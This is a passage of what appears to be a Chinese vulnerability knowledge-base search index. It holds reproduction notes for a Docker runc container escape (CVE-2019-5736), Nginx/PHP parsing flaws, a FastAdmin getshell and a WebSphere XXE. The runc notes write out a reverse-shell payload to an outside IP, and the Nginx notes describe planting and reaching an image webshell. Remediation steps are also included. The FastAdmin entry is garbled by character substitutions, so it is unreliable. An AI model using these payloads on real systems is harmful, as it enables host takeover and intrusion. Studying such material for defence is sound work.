18.09.2\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u4f7f\u7528\u4e86\u7684runc\u7248\u672c\u5c0f\u4e8e1.0-rc6\u3002\uff09 \u53ef\u901a\u8fc7 docker \u548cdocker-runc \u67e5\u770b\u5f53\u524d\u7248\u672c\u60c5\u51b5\u3002 \u6f0f\u6d1e\u6d4b\u8bd5\u590d\u73b0\uff1a 1\u3001\u6f0f\u6d1e\u73af\u5883\u51c6\u5907\uff1a curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh \u6216\u8005\u76f4\u63a5\u4e0b\u8f7d\u811a\u672c\u5b89\u88c5 chmod 777 install.sh && ./install.sh install.sh \u5185\u5bb9\u5982\u4e0b\uff1a #!/bin/bash # date: 20190523 # author: thinkycx # Description: you can use this to install vulnerable docker ( CVE-2019-5736 docker runc escape ) # tested on centos7/ubuntu16.04 # Usage: # 1. curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh # 2. run docker_escape in docker container # _centos_docker_old_version(){ sudo yum install containerd.io wget https://download.docker.com/linux/centos/7/x86_64/stable/Packages/docker-ce-18.06.0.ce-3.el7.x86_64.rpm sudo yum install docker-ce-18.06.0.ce-3.el7.x86_64.rpm # sudo yum install docker-ce-cli # I cannot find a version matches with the docker-ce, so I didn't install it. # docker --version # Docker version 18.06.0-ce, build 0ffa825 # more info # It seems that we can use the scirpt to install docker. I haven't tested it. # apt-get -y install curl # curl -fsSL test.docker.com -o test-docker.sh # VERSION=18.03.1 sh test-docker.sh } centos_install_docker(){ # date 20190523 # ref https://docs.docker.com/install/linux/docker-ce/centos/#install-using-the-convenience-script echo \"[*] uninstall old...\" sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine # The contents of /var/lib/docker/, including images, containers, volumes, and networks, are preserved. # The Docker CE package is now called docker-ce # Install using the repository ## SET UP THE REPOSITORY ### Install required packages. yum-utils provides the yum-config-manager utility sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 ### set up the stable repository. sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo # install a specific version of Docker CE #yum list docker-ce --showduplicates | sort -r # sudo yum install docker-ce-<VERSION_STRING> docker-ce-cli-<VERSION_STRING> containerd.io # e.g docker-ce-18.09.1 #sudo yum install docker-ce-18.09.6 docker-ce-cli-18.09.6 containerd.io # check GPG key, verify that the fingerprint matches # 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35 _centos_docker_old_version sudo systemctl start docker } ubuntu_install_docker(){ # use script to install docker on ubuntu curl -fsSL https://get.docker.com -o get-docker.sh && \\ sudo VERSION=18.06.0 sh get-docker.sh sudo systemctl start docker } install_dependencies(){ source /etc/os-release echo \"OS: \", $ID if [ $ID == \"centos\" ]; then centos_install_docker elif [ $ID == \"ubuntu\" ]; then ubuntu_install_docker else echo \"[!] cannot support your OS.\" exit fi echo \"[*] start to run docker...\" docker run -it ubuntu:18.04 \"/bin/bash\" } # bash main... install_dependencies # Please run it manually in docker container. docker_escape(){ # run commands in container as to escape docker container . # yous should compile POC yourself # https://github.com/Frichetten/CVE-2019-5736-PoC # compile main.go on macOS : # $ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o poc main.go apt-get update -y && \\ apt-get install curl -y && \\ apt-get install libseccomp-dev -y curl URL -o poc && \\ chmod u+x ./poc ./poc } 2\u3001\u4e0b\u8f7dPOC\uff0c\u7f16\u8bd1\u811a\u672c # \u4e0b\u8f7dPOC git clone https://github.com/Frichetten/CVE-2019-5736-PoC # \u4fee\u6539Payload vi main.go payload = \"#!/bin/bash \\n bash -i >& /dev/tcp/192.168.172.136/1234 0>&1\" # \u7f16\u8bd1\u751f\u6210payload CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 3\u3001\u6a21\u4eff\u653b\u51fb\u8005\uff0c\u5728\u5bb9\u5668\u4e2d\u6267\u884cpayload # \u62f7\u8d1d\u5230docker\u5bb9\u5668 sudo docker cp ./main 248f8b7d3c45:/tmp # \u8fdb\u5165\u5bb9\u5668 sudo docker exec -it 248f8b7d3c45 /bin/bash# \u4fee\u6539\u6743\u9650chmod 777 main# \u6267\u884cPayload./main 4\u3001\u5047\u8bbe\uff0c\u7ba1\u7406\u5458\u901a\u8fc7exec\u8fdb\u5165\u5bb9\u5668\uff0c\u4ece\u800c\u89e6\u53d1Payload\u3002 sudo docker exec -it cafa20cfb0f9 /bin/sh 5\u3001\u5728192.168.172.136\u4e0a\u76d1\u542c\u672c\u5730\u7aef\u53e3\uff0c\u6210\u529f\u83b7\u53d6\u5bbf\u4e3b\u673a\u53cd\u5f39\u56de\u6765\u7684shell\u3002","title":"docker runC\u5bb9\u5668\u9003\u9038\u6f0f\u6d1eCVE 2019 5736"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/fastadmin/fastadmin%E6%9C%80%E6%96%B0%E7%89%88%E5%89%8D%E5%8F%B0getshell/","text":"\u524d\u63d0\uff1a\u5f00\u542f\u2f64\u6237\u6ce8\u518c \u6f0f\u6d1e\u539f\u56e0\uff1a \u76f4\u63a5\u5c06$name\u53c2\u6570\u5e26\u2f0a\u5230fetch\u51fd\u6570,fetch\u51fd\u6570\u662fThinkPHP\u89e3\u6790\u6a21\u7248\u7684\u51fd\u6570\uff0c\u2fa5\u2faf\u2f40\u6301\u539f\u2f63PHP\uff0c\u6240\u4ee5\u9020\u6210 RCE\uff0c\u76f4\u63a5\u4e0a\u4f20\u6210\u529f\u5c31\u53ef\u4ee5\u8c03\u2f64\u8fd9\u4e2a\u70b9\u89e3\u6790\u3002 Php\u4ee3\u739b\u53ef\u4ee5\u548c\u6807\u76ca\u5728\u6a21\u677f\u2f42\u4ef6\u4e2d\u6f0f\u5408\u4f7f\u2f64,\u53ef\u4ee5\u5728\u6a21\u677f\u2f42\u4ef6\u2fa5\u2faf\u5343\u5199\u4efb\u610f\u7684P\u53e5\u4ee3\u7801,\u5305\u62ec\u4e0b\u2faf\u4e24\u79cd\u2f45\u5f0f: \u4f7f\u2f64php\u6807\u7b7e \u4f8b\u5982: \u6211\u4eec\u5efa\u8fd9\u9700\u8981\u4f7f\u2f64PHP\u4ee3\u7684\u65f6\u5019\u5c3d\u91cf\u91c7\u2f64hp\u7b7e,\u56e0\u4e3a\u539f\u2f63\u7684PHP\u6cd5\u53ef\u80fd\u4f1a\u88ab\u914d\u7f6e\u7981\u2f64\u2f7d\u5bfc\u81f4\u89e3\u6790\u9519\u8bef. \u4f7f\u2f64\u539f\u2f63php\u4ee3\u7801 \u6ce8\u610f:php\u6807\u7b7e\u6216\u8005h\u4ee3\u7801\u2fa5\u2faf\u5c31\u4e0d\u80fd\u518d\u4f7f\u2f64\u6807\u7b7e(\u5305\u666e\u901a\u6807\u76d7\u548c\u4e48\u6807)\u4e86,\u56e0\u6b64\u4e0b\u2faf\u7684\u2f0f\u79cd\u2f45\u5f0f\u90fd\u662f\u2f46\u6548\u7684;","title":"fastadmin\u6700\u65b0\u7248\u524d\u53f0getshell"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u8fd9\u4e00\u6f0f\u6d1e\u662f\u7531\u4e8eNginx\u4e2dphp\u914d\u7f6e\u4e0d\u5f53\u800c\u9020\u6210\u7684\uff0c\u4e0eNginx\u7248\u672c\u65e0\u5173 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 Nginx\u62ff\u5230\u6587\u4ef6\u8def\u5f84\uff08\u66f4\u4e13\u4e1a\u7684\u8bf4\u6cd5\u662fURI\uff09/test.jpg/test.php\u540e\uff0c\u4e00\u770b\u540e\u7f00\u662f.php\uff0c\u4fbf\u8ba4\u4e3a\u8be5\u6587\u4ef6\u662fphp\u6587\u4ef6\uff0c\u8f6c\u4ea4\u7ed9php\u53bb\u5904\u7406\u3002php\u4e00\u770b/test.jpg/test.php\u4e0d\u5b58\u5728\uff0c\u4fbf\u5220\u53bb\u6700\u540e\u7684/test.php\uff0c\u53c8\u770b/test.jpg\u5b58\u5728\uff0c\u4fbf\u628a/test.jpg\u5f53\u6210\u8981\u6267\u884c\u7684\u6587\u4ef6\u4e86 \u8fd9\u5176\u4e2d\u6d89\u53ca\u5230php\u7684\u4e00\u4e2a\u9009\u9879\uff1acgi.fix_pathinfo\uff0c\u8be5\u503c\u9ed8\u8ba4\u4e3a1\uff0c\u8868\u793a\u5f00\u542f\u3002\u5f00\u542f\u8fd9\u4e00\u9009\u9879\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u5bf9\u6587\u4ef6\u8def\u5f84\u8fdb\u884c\u201c\u4fee\u7406\u201d\u3002\u4f55\u8c13\u201c\u4fee\u7406\u201d\uff1f\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53php\u9047\u5230\u6587\u4ef6\u8def\u5f84\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u65f6\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u53bb\u6389\u6700\u540e\u7684\u201c/ccc.zzz\u201d\uff0c\u7136\u540e\u5224\u65ad\u201c/aaa.xxx/bbb.yyy\u201d\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\uff0c\u5219\u628a\u201c/aaa.xxx/bbb.yyy\u201d\u5f53\u505a\u6587\u4ef6\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy\u201d\u4ecd\u4e0d\u5b58\u5728\uff0c\u5219\u7ee7\u7eed\u53bb\u6389\u201c/bbb.yyy\u201d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u8be5\u9009\u9879\u5728\u914d\u7f6e\u6587\u4ef6php.ini\u4e2d \u65b0\u7248\u672c\u7684php\u5f15\u5165\u4e86\u201csecurity.limit_extensions\u201d\uff0c\u9650\u5236\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540e\u7f00\uff0c\u9ed8\u8ba4\u53ea\u5141\u8bb8\u6267\u884c.php\u6587\u4ef6 \u590d\u73b0\u8fc7\u7a0b \u00b6 1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883 2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883 docker-compose up -d 3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/ 4.\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c 5.\u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/uploadfiles/156005c5baf40ff51a327f1c34f2975b.jpg/a.php \u4e0b\u56fe\u770b\u5230\u6210\u529f\u6267\u884c\u4e86php\u4ee3\u7801,\u8bf4\u660e\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e 6.\u6211\u4eec\u7528\u4e2d\u56fd\u8681\u5251\u53bb\u8fde\u63a5 \u6f0f\u6d1e\u4fee\u590d \u00b6 \u4e3b\u8981\u662f\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u4e0d\u5f53\u9020\u6210\u7684\u3002 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/php.ini \u5c06cgi.fix_pathinfo=1\uff0c\u8bbe\u7f6e\u4e3a0 2.\u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/pool.d/ www.conf \u5c06security.limit_extensions=\uff0c\u8bbe\u7f6e\u4e3a\uff1a security.limit_extensions=.php\uff0c\u53ea\u5141\u8bb8php\u6587\u4ef6\u89e3\u6790","title":"Nginx\u4e2dphp\u914d\u7f6e\u9519\u8bef\u5bfc\u81f4\u7684\u89e3\u6790\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","text":"\u8fd9\u4e00\u6f0f\u6d1e\u662f\u7531\u4e8eNginx\u4e2dphp\u914d\u7f6e\u4e0d\u5f53\u800c\u9020\u6210\u7684\uff0c\u4e0eNginx\u7248\u672c\u65e0\u5173","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","text":"Nginx\u62ff\u5230\u6587\u4ef6\u8def\u5f84\uff08\u66f4\u4e13\u4e1a\u7684\u8bf4\u6cd5\u662fURI\uff09/test.jpg/test.php\u540e\uff0c\u4e00\u770b\u540e\u7f00\u662f.php\uff0c\u4fbf\u8ba4\u4e3a\u8be5\u6587\u4ef6\u662fphp\u6587\u4ef6\uff0c\u8f6c\u4ea4\u7ed9php\u53bb\u5904\u7406\u3002php\u4e00\u770b/test.jpg/test.php\u4e0d\u5b58\u5728\uff0c\u4fbf\u5220\u53bb\u6700\u540e\u7684/test.php\uff0c\u53c8\u770b/test.jpg\u5b58\u5728\uff0c\u4fbf\u628a/test.jpg\u5f53\u6210\u8981\u6267\u884c\u7684\u6587\u4ef6\u4e86 \u8fd9\u5176\u4e2d\u6d89\u53ca\u5230php\u7684\u4e00\u4e2a\u9009\u9879\uff1acgi.fix_pathinfo\uff0c\u8be5\u503c\u9ed8\u8ba4\u4e3a1\uff0c\u8868\u793a\u5f00\u542f\u3002\u5f00\u542f\u8fd9\u4e00\u9009\u9879\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u5bf9\u6587\u4ef6\u8def\u5f84\u8fdb\u884c\u201c\u4fee\u7406\u201d\u3002\u4f55\u8c13\u201c\u4fee\u7406\u201d\uff1f\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53php\u9047\u5230\u6587\u4ef6\u8def\u5f84\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u65f6\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u53bb\u6389\u6700\u540e\u7684\u201c/ccc.zzz\u201d\uff0c\u7136\u540e\u5224\u65ad\u201c/aaa.xxx/bbb.yyy\u201d\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\uff0c\u5219\u628a\u201c/aaa.xxx/bbb.yyy\u201d\u5f53\u505a\u6587\u4ef6\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy\u201d\u4ecd\u4e0d\u5b58\u5728\uff0c\u5219\u7ee7\u7eed\u53bb\u6389\u201c/bbb.yyy\u201d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u8be5\u9009\u9879\u5728\u914d\u7f6e\u6587\u4ef6php.ini\u4e2d \u65b0\u7248\u672c\u7684php\u5f15\u5165\u4e86\u201csecurity.limit_extensions\u201d\uff0c\u9650\u5236\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540e\u7f00\uff0c\u9ed8\u8ba4\u53ea\u5141\u8bb8\u6267\u884c.php\u6587\u4ef6","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_3","text":"1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883 2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883 docker-compose up -d 3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/ 4.\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c 5.\u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/uploadfiles/156005c5baf40ff51a327f1c34f2975b.jpg/a.php \u4e0b\u56fe\u770b\u5230\u6210\u529f\u6267\u884c\u4e86php\u4ee3\u7801,\u8bf4\u660e\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e 6.\u6211\u4eec\u7528\u4e2d\u56fd\u8681\u5251\u53bb\u8fde\u63a5","title":"\u590d\u73b0\u8fc7\u7a0b"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_4","text":"\u4e3b\u8981\u662f\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u4e0d\u5f53\u9020\u6210\u7684\u3002 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/php.ini \u5c06cgi.fix_pathinfo=1\uff0c\u8bbe\u7f6e\u4e3a0 2.\u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/pool.d/ www.conf \u5c06security.limit_extensions=\uff0c\u8bbe\u7f6e\u4e3a\uff1a security.limit_extensions=.php\uff0c\u53ea\u5141\u8bb8php\u6587\u4ef6\u89e3\u6790","title":"\u6f0f\u6d1e\u4fee\u590d"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u7248\u672c \u00b6 Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u8be5\u6f0f\u6d1e\u5229\u7528\u4e86Nginx\u9519\u8bef\u7684\u89e3\u6790\u4e86URL\u5730\u5740\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u670d\u52a1\u7aef\u9650\u5236\uff0c\u4ece\u800c\u89e3\u6790PHP\u6587\u4ef6\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u7684\u5371\u5bb3\u3002 \u6839\u636enginx.conf\u6587\u4ef6\u4e2dlocation\u4e2d\u7684\u5b9a\u4e49\uff0c\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6\u90fd\u89e3\u6790\u4e3aphp\u3002\u82e5\u6211\u4eec\u8bbf\u95ee\u7684\u6587\u4ef6\u540d\u4e3ashell.gif[0x20][0x00].php\uff0c\u8be5\u6587\u4ef6\u540d\u4ee5.php\u7ed3\u5c3e\u53ef\u4ee5\u88abFastCGI\u63a5\u6536\uff0cFastCGI\u5728\u8bfb\u53d6\u6587\u4ef6\u540d\u65f6\u88ab00\u622a\u65ad\uff0c\u5bfc\u81f4\u8bfb\u53d6\u7684\u6587\u4ef6\u540d\u4e3a1.gif[0x20]\uff0c\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u6709\u4e24\u4e2a\uff1a 1.Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 2.php-fpm.conf\u4e2d\u7684security.limit_extensions\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4efb\u610f\u540e\u7f00\u540d\u90fd\u53ef\u4ee5\u89e3\u6790\u4e3aPHP \u590d\u73b0\u8fc7\u7a0b \u00b6 1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883 2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883 docker-compose up -d 3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129:8080/ 4.\u4e0a\u4f20\u4e2a\u56fe\u7247\u9a6c \u53d1\u73b0\u4e0a\u4f20\u6210\u529f\u5e76\u8fd4\u56de\u8def\u5f84 5.5.\u63a5\u4e0b\u6765\u9700\u8981\u6784\u9020\u6211\u4eec test.gif[0x20][0x00].php \u6765\u9020\u6210Nginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u4f7f\u6211\u4eec\u7684test.gif\u88ab\u89e3\u6790\u6210php url: http://192.168.247.129:8080/uploadfiles/test.gif%20%20.php \u624b\u5de5\u66f4\u6539\u6210\u4e0b\u56fe \u9009\u4e2d%00\u8fdb\u884c\u89e3\u7801 \u8f6c\u53d1\u6570\u636e\u5305 \u89e3\u6790\u6210\u529f\uff01","title":"Nginx\u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_1","text":"Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7","title":"\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_2","text":"\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86Nginx\u9519\u8bef\u7684\u89e3\u6790\u4e86URL\u5730\u5740\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u670d\u52a1\u7aef\u9650\u5236\uff0c\u4ece\u800c\u89e3\u6790PHP\u6587\u4ef6\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u7684\u5371\u5bb3\u3002 \u6839\u636enginx.conf\u6587\u4ef6\u4e2dlocation\u4e2d\u7684\u5b9a\u4e49\uff0c\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6\u90fd\u89e3\u6790\u4e3aphp\u3002\u82e5\u6211\u4eec\u8bbf\u95ee\u7684\u6587\u4ef6\u540d\u4e3ashell.gif[0x20][0x00].php\uff0c\u8be5\u6587\u4ef6\u540d\u4ee5.php\u7ed3\u5c3e\u53ef\u4ee5\u88abFastCGI\u63a5\u6536\uff0cFastCGI\u5728\u8bfb\u53d6\u6587\u4ef6\u540d\u65f6\u88ab00\u622a\u65ad\uff0c\u5bfc\u81f4\u8bfb\u53d6\u7684\u6587\u4ef6\u540d\u4e3a1.gif[0x20]\uff0c\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u6709\u4e24\u4e2a\uff1a 1.Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 2.php-fpm.conf\u4e2d\u7684security.limit_extensions\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4efb\u610f\u540e\u7f00\u540d\u90fd\u53ef\u4ee5\u89e3\u6790\u4e3aPHP","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_3","text":"1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883 2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883 docker-compose up -d 3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129:8080/ 4.\u4e0a\u4f20\u4e2a\u56fe\u7247\u9a6c \u53d1\u73b0\u4e0a\u4f20\u6210\u529f\u5e76\u8fd4\u56de\u8def\u5f84 5.5.\u63a5\u4e0b\u6765\u9700\u8981\u6784\u9020\u6211\u4eec test.gif[0x20][0x00].php \u6765\u9020\u6210Nginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u4f7f\u6211\u4eec\u7684test.gif\u88ab\u89e3\u6790\u6210php url: http://192.168.247.129:8080/uploadfiles/test.gif%20%20.php \u624b\u5de5\u66f4\u6539\u6210\u4e0b\u56fe \u9009\u4e2d%00\u8fdb\u884c\u89e3\u7801 \u8f6c\u53d1\u6570\u636e\u5305 \u89e3\u6790\u6210\u529f\uff01","title":"\u590d\u73b0\u8fc7\u7a0b"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Nginx version 0.5.6 - 1.13.2 \u6f0f\u6d1ePOC \u00b6 POC \u4f7f\u7528\u65b9\u6cd5\uff1apython3 poc.py targeturl","title":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","text":"Nginx version 0.5.6 - 1.13.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","text":"POC \u4f7f\u7528\u65b9\u6cd5\uff1apython3 poc.py targeturl","title":"\u6f0f\u6d1ePOC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/","text":"\u6f0f\u6d1e\u5206\u6790\uff1a \u00b6 IBM WebSphere \u5e94\u2f64\u7a0b\u5e8f\u670d\u52a1\u56687.0\u30018.0\u30018.5 \u548c9.0 \u5728\u5904\u7406XML \u6570\u636e\u65f6\u5bb9\u6613\u53d7\u5230XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a \uff08XXE\uff09 \u653b\u51fb\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u2f64\u6b64\u6f0f\u6d1e\u516c\u5f00\u654f\u611f\u4fe1\u606f\u3002IBM Xforce ID\uff1a185590\u3002 \u5f71\u54cd\u8303\u56f4\uff1a \u00b6 WebSphere Application Server 7.0\u7248\u672c WebSphere Application Server 8.0\u7248\u672c WebSphere Application Server 8.5\u7248\u672c WebSphere Application Server 9.0\u7248\u672c \u4fee\u590d\u5efa\u8bae\uff1a \u00b6 \u5b98\u2f45\u5df2\u7ecf\u63d0\u4f9b\u7684\u8865\u4e01\u7248\u672c\u5217\u8868\uff1a WebSphere 9.0.0.0 - 9.0.5.5\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52309.0.5.6\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.5.0.0 - 8.5.5.17\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52308.5.5.19\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.0.0.0 - 8.0.0.15\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52308.0.0.15\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01 WebSphere 7.0.0.0 - 7.0.0.45 